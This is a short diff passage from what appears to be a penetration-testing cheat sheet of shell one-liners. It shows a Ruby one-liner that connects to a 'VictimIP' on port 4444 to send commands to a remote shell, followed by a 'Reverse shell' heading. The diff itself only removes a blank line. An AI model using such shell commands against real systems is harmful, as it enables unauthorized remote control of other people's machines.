@@ -7,7 +7,6 @@ from terminal
 ```ruby
 ruby -rsocket -e's=TCPSocket.new("VictimIP",4444);loop do;cmd=gets.chomp;s.puts cmd;s.close if cmd=="exit";puts s.recv(1000000);end'
 ```
-
 since `192.168.0.15` is the victim IP
 
 ## Reverse shell
